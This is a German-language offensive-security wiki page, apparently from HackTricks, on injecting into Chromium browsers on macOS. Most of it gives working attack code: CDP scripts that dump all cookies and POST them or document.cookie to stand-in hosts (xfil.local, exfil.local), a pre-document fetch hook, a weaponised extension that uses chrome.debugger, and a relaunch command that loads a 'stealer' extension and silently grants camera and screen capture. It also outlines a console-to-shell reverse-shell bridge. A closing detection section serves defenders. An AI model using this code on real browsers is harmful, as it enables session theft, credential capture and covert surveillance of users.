# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Chromium-basierte Browser wie Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi und Opera verwenden alle dieselben Command-Line-Switches, Preference-Dateien und DevTools-Automation-Interfaces. Unter macOS kann jeder Benutzer mit GUI-Zugriff eine bestehende Browser-Sitzung beenden und sie mit beliebigen Flags, Extensions oder DevTools-Endpunkten erneut öffnen, die mit den Entitlements des Zielbenutzers ausgeführt werden.

#### Chromium mit benutzerdefinierten Flags unter macOS starten

macOS hält pro Chromium-Profil nur eine einzige UI-Instanz aktiv. Daher muss der Browser für Instrumentierung normalerweise zwangsweise geschlossen werden, beispielsweise mit `osascript -e 'tell application "Google Chrome" to quit'`. Angreifer starten ihn typischerweise über `open -na "Google Chrome" --args <flags>` neu, um Argumente einzuschleusen, ohne das App-Bundle zu verändern. Wird dieser Befehl in einen benutzerspezifischen LaunchAgent (`~/Library/LaunchAgents/*.plist`) oder einen Login-Hook eingebettet, wird sichergestellt, dass der manipulierte Browser nach einem Neustart oder Abmelden erneut gestartet wird.

#### `--load-extension` Flag

Das `--load-extension` Flag lädt automatisch entpackte Extensions (durch Kommas getrennte Pfade). Zusammen mit `--disable-extensions-except` können legitime Extensions blockiert und ausschließlich die eigene Payload zur Ausführung gebracht werden. Schädliche Extensions können weitreichende Berechtigungen wie `debugger`, `webRequest` und `cookies` anfordern, um auf DevTools-Protokolle zuzugreifen, CSP-Header zu verändern, HTTPS herabzustufen oder Sitzungsdaten unmittelbar nach dem Browserstart zu exfiltrieren.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Diese Switches stellen das Chrome DevTools Protocol (CDP) über TCP oder eine Pipe bereit, sodass externe Tools den Browser steuern können. Google beobachtete einen weitverbreiteten Missbrauch dieser Schnittstelle durch Infostealer. Seit Chrome 136 (März 2025) werden die Switches für das Standardprofil ignoriert, sofern der Browser nicht mit einem nicht standardmäßigen `--user-data-dir` gestartet wird. Dadurch wird App-Bound Encryption für echte Profile erzwungen. Angreifer können jedoch weiterhin ein neues Profil starten, das Opfer dazu bringen, sich darin zu authentifizieren (Phishing/Unterstützung bei der Triage), und über CDP Cookies, Tokens, Gerätevertrauenszustände oder WebAuthn-Registrierungen abgreifen.<sup>[5]</sup>

#### `--user-data-dir` Flag

Dieses Flag leitet das gesamte Browserprofil (History, Cookies, Login Data, Preference-Dateien usw.) in einen von einem Angreifer kontrollierten Pfad um. Es ist erforderlich, wenn moderne Chrome-Versionen mit `--remote-debugging-port` kombiniert werden. Außerdem bleibt das manipulierte Profil isoliert, sodass vorab befüllte `Preferences`- oder `Secure Preferences`-Dateien abgelegt werden können, die Sicherheitsabfragen deaktivieren, Extensions automatisch installieren und Standardschemata ändern.

#### `--use-fake-ui-for-media-stream` Flag

Dieser Switch umgeht die Berechtigungsabfrage für Kamera und Mikrofon, sodass jede Seite, die `getUserMedia` aufruft, sofort Zugriff erhält. In Kombination mit Flags wie `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` oder CDP-`Browser.grantPermissions`-Befehlen können Audio und Video lautlos aufgezeichnet, der Desktop geteilt oder WebRTC-Berechtigungsprüfungen ohne Benutzerinteraktion erfüllt werden.

## In freier Wildbahn beobachtete Zustellungs- und Relaunch-Muster

CDP-Missbrauch ist üblicherweise eine **Post-Exploitation**-Phase und nicht die initiale Payload. Eine aktuelle, auf macOS-Entwickler abzielende Kampagne verwendete eine manipulierte Xcode-**`Run Script` Build-Phase** (`PBXShellScriptBuildPhase`), sodass Code nur ausgeführt wurde, wenn das Opfer das Projekt **baute**, nicht wenn es lediglich geklont oder geöffnet wurde. Nach der ersten Ausführung infizierte die Malware außerdem weitere `.xcodeproj`-Verzeichnisse, fügte schädliche Git-`pre-commit`-Hooks hinzu und durchsuchte ZIP-Archive nach weiteren Xcode-Projekten.<sup>[3]</sup>

Für Chromium-Missbrauch ist dies relevant, weil der Angreifer die Browser-Binärdatei selbst nicht patchen muss. Ein kurzlebiger Build-Phase-/`osascript`-Stager kann stattdessen einen **Browser-Wrapper** (LaunchAgent, Login-Item, Dock-Eintrag, trojanisierter App-Launcher usw.) installieren, der den legitimen Browser bei jedem Start des Benutzers mit vom Angreifer kontrollierten Flags erneut öffnet.<sup>[3]</sup>

> [!TIP]
> Untersuchen Sie auf Entwickler-Endpunkten `.pbxproj`-Dateien, `.git/hooks/pre-commit` und ZIPs mit `.xcodeproj` auf unerwartete Vorkommen von `curl`, `osascript`, `xxd`, verschachteltem `base64` oder Chrome-Relaunch-Logik.

## Missbrauch von Remote Debugging und dem DevTools Protocol

Sobald Chrome mit einem dedizierten `--user-data-dir` und `--remote-debugging-port` neu gestartet wurde, können Sie sich über CDP verbinden (beispielsweise mit `chrome-remote-interface`, `puppeteer` oder `playwright`) und Workflows mit weitreichenden Berechtigungen automatisieren:

- **Cookie-/Sitzungsdiebstahl:** `Network.getAllCookies` und `Storage.getCookies` geben auch HttpOnly-Werte zurück, selbst wenn App-Bound Encryption normalerweise den Dateisystemzugriff blockieren würde, da CDP den laufenden Browser auffordert, sie zu entschlüsseln.
- **Manipulation von Berechtigungen:** `Browser.grantPermissions` und `Emulation.setGeolocationOverride` ermöglichen das Umgehen von Kamera-/Mikrofonabfragen (insbesondere in Kombination mit `--use-fake-ui-for-media-stream`) oder das Fälschen standortbasierter Sicherheitsprüfungen.
- **Tastaturanschlags-/Script-Injection:** `Runtime.evaluate` führt beliebiges JavaScript im aktiven Tab aus und ermöglicht das Abgreifen von Zugangsdaten, das Patchen des DOM oder das Einschleusen von Persistence-Beacons, die Navigationen überstehen.<sup>[1]</sup>
- **Live-Exfiltration:** `Network.webRequestWillBeSentExtraInfo` und `Fetch.enable` fangen authentifizierte Requests und Responses in Echtzeit ab, ohne Artefakte auf der Festplatte zu hinterlassen.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Da Chrome 136 CDP im Standardprofil blockiert, liefert das Kopieren des vorhandenen Verzeichnisses `~/Library/Application Support/Google/Chrome` des Opfers in einen Staging-Pfad keine entschlüsselten Cookies mehr. Stattdessen sollte der Benutzer durch Social Engineering dazu gebracht werden, sich innerhalb des instrumentierten Profils zu authentifizieren (z. B. während einer „hilfreichen“ Support-Sitzung), oder MFA-Tokens sollten während der Übertragung über CDP-gesteuerte Network Hooks abgegriffen werden.<sup>[5]</sup>

### XCSSET-style CDP Backdoor Chain

Ein praktisches Malware-Muster sieht folgendermaßen aus:

1. Das Userland-Implantat oder der Wrapper wird bei jedem Start von Chrome neu gestartet.
2. Der legitime Browser wird mit `--remote-debugging-port=<port>` und unter Chrome 136+ gewöhnlich mit einem zugehörigen, nicht standardmäßigen `--user-data-dir=<dir>` gestartet.
3. Ein Helper wird gestartet, der sich mit dem lokalen CDP WebSocket verbindet und mit `Page.addScriptToEvaluateOnNewDocument` einen Pre-Document-Hook registriert.<sup>[2]</sup>

Dieser Helper kann JavaScript **vor** der Ausführung des Website-Codes injizieren. Das eignet sich ideal zum Hooken von `window.fetch`, `XMLHttpRequest`, Wallet-Providern oder Autofill-Abläufen, ohne Dateien auf der Festplatte patchen zu müssen.<sup>[3]</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Eine stärkere Variante verwandelt den Browser in eine **host command bridge**: Injiziertes JavaScript gibt ein mit einem Delimiter markiertes `console.log` aus, der lokale Helfer überwacht `Runtime.consoleAPICalled`, entfernt die Markierung, führt den Rest über die Host-Shell aus (zum Beispiel mit Go's `exec.Command`) und sendet stdout/stderr über den WebSocket des Angreifers zurück. Dadurch wird die Script-Ausführung auf Tab-Ebene zu einer weitgehend fileless Reverse Shell erweitert.<sup>[3]</sup>

## Extension-basierte Injection via Debugger API

Die 2023 veröffentlichte Forschung "Chrowned by an Extension" zeigte, dass eine bösartige Extension mithilfe der `chrome.debugger` API an jeden Tab angehängt werden und dieselben DevTools-Rechte wie `--remote-debugging-port` erlangen kann.<sup>[6]</sup> Dadurch werden die ursprünglichen Isolationsannahmen außer Kraft gesetzt (Extensions bleiben in ihrem eigenen Kontext), und es wird Folgendes ermöglicht:

- Unbemerkter Diebstahl von Cookies und Credentials mit `Network.getAllCookies`/`Fetch.getResponseBody`.
- Änderung von Site-Berechtigungen (Kamera, Mikrofon, Geolocation) und Umgehung von Security-Interstitials, wodurch Phishing-Seiten Chrome-Dialoge imitieren können.
- Manipulation von TLS-Warnungen, Downloads oder WebAuthn-Prompts on path durch programmgesteuerte Steuerung von `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` oder `Security.handleCertificateError`.

Lade die Extension mit `--load-extension`/`--disable-extensions-except`, sodass keine Interaktion des Benutzers erforderlich ist. Ein minimales Background-Script, das die API weaponized, sieht folgendermaßen aus:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Die Erweiterung kann außerdem `Debugger.paused`-Events abonnieren, um JavaScript-Variablen zu lesen, Inline-Scripts zu patchen oder benutzerdefinierte Breakpoints zu setzen, die eine Navigation überdauern. Da alles innerhalb der GUI-Sitzung des Benutzers ausgeführt wird, werden Gatekeeper und TCC nicht ausgelöst. Dadurch eignet sich diese Technik besonders für malware, die bereits Code im Benutzerkontext ausführen konnte.<sup>[6]</sup>

## Erkennung & Hunting

- Alarmiere bei Chromium-Browsern, die mit `--remote-debugging-port`, `--remote-debugging-pipe` oder einem verdächtigen `--user-data-dir` gestartet wurden, insbesondere wenn der übergeordnete Prozess `bash`, `sh`, `osascript`, `xcodebuild` oder ein LaunchAgent-Hilfsprozess ist.
- Suche nach kurzen Ketten, in denen ein Hilfsprozess einen lokalen CDP-WebSocket öffnet, `Page.addScriptToEvaluateOnNewDocument` registriert und anschließend eine langlebige ausgehende WebSocket-/HTTPS-Verbindung herstellt.
- Suche nach Console-to-Shell-Brücken, indem du die Browseraktivität von `Runtime.consoleAPICalled` mit untergeordneten Shells oder Hilfsprozessen korrelierst, die vom Angreifer bereitgestellte Befehle ausführen.
- Überprüfe auf Entwickler-Macs `.pbxproj`-Einträge in `PBXShellScriptBuildPhase`, Git-`pre-commit`-Hooks, Dock-/Login-Item-Relauncher sowie in ZIP-Dateien enthaltene Xcode-Projekte auf die Installation von Browser-Wrappern.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Tools

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatisiert Chromium-Starts mit Payload-Erweiterungen und stellt interaktive CDP-Hooks bereit.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Ähnliche Tools mit Fokus auf das Abfangen von Datenverkehr und die Browser-Instrumentierung für macOS-Operatoren.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js-Bibliothek zum Scripting von Chrome-DevTools-Protocol-Dumps (Cookies, DOM, Berechtigungen), sobald eine Instanz mit aktiviertem `--remote-debugging-port` läuft.

### Example
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Weitere Beispiele findest du in den Links zu den Tools.

## Referenzen

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
